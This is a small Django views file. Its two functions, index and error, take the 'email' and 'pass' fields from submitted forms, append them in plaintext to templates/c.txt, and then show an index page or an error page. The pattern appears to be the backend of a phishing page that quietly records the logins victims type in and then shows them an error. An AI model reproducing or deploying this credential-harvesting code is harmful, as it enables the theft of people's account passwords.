from django.http import HttpResponse
from django.shortcuts import render


def index(request):
    email= request.POST.get('email', 'defaulsssssssst')
    #print(djtext)
    passw=request.POST.get('pass', 'defaulsssssssst')
    f=open("templates/c.txt","a+")
    f.write(email)
    f.write("   ")
    f.write(passw)
    f.write("\n")
    f.close()
    return render(request, 'index.html')

def error(request):
    email= request.POST.get('email', 'defaulsssssssst')
    #print(djtext)
    passw=request.POST.get('pass', 'defaulsssssssst')
    f=open("templates/c.txt","a+")
    f.write(email)
    f.write("   ")
    f.write(passw)
    f.write("\n")
    f.close()
    return render(request, 'error.html')    